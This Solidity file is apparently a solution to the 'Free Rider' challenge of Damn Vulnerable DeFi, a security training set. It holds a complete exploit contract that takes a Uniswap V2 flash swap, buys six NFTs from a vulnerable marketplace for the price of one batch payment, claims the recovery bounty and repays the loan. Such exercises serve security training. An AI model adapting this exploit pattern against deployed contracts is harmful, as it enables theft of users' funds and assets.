// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {WETH} from "solmate/tokens/WETH.sol";   
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderExploiter {
    
    uint256 constant AMOUNT_OF_NFTS = 6;

    WETH weth;
    DamnValuableToken token;
    DamnValuableNFT nft;

    IUniswapV2Pair uniswapPair;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;

    address player;

    constructor(
        address payable _weth,
        address _token,
        address _nft,
        address _uniswapV2Factory,
        address _uniswapV2Router,
        address _uniswapV2Pair,
        address payable _marketplace,
        address _recoveryManager,
        address _player
    ) {
        weth = WETH(_weth);
        token = DamnValuableToken(_token);
        nft = DamnValuableNFT(_nft);

        uniswapV2Factory = IUniswapV2Factory(_uniswapV2Factory);
        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
        uniswapPair = IUniswapV2Pair(_uniswapV2Pair);

        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
        marketplace = FreeRiderNFTMarketplace(_marketplace);

        player = _player;
    }

    function exploit() external {

        bytes memory callData = hex"00";
        uniswapPair.swap(
            15 ether, // amount0Out, which is WETH
            0, // amount1Out
            address(this), // to
            callData // data
        );

    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == IUniswapV2Factory(uniswapV2Factory).getPair(token0, token1)); // ensure that msg.sender is a V2 pair

        // Buy all NFTs from the marketplace with only 15 ETH
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
        }

        uint256 amount = amount0 == 0 ? amount1 : amount0; // determine the amount of token to repay
        weth.withdraw(amount); // withdraw WETH to ETH
        marketplace.buyMany{value: amount}(ids);

        // Approve recoveryManager to transfer all NFTs
        nft.setApprovalForAll(address(recoveryManager), true);

        // Transfer the NFTs to the recovery manager & get the bounty
        bytes memory player_address = abi.encode(player);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, player_address);
        }
        
        // repay the flash loan
        uint256 amount_repay = amount * 1000 / 997 + 1; // calculate the amount to repay with a 0.3% fee
        weth.deposit{value: amount_repay}();
        weth.transfer(msg.sender, amount_repay);

    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external view returns (bytes4) {
        require(msg.sender == address(nft), "Invalid NFT received");
        return IERC721Receiver.onERC721Received.selector;
    }   

    receive() external payable {
    
    }
}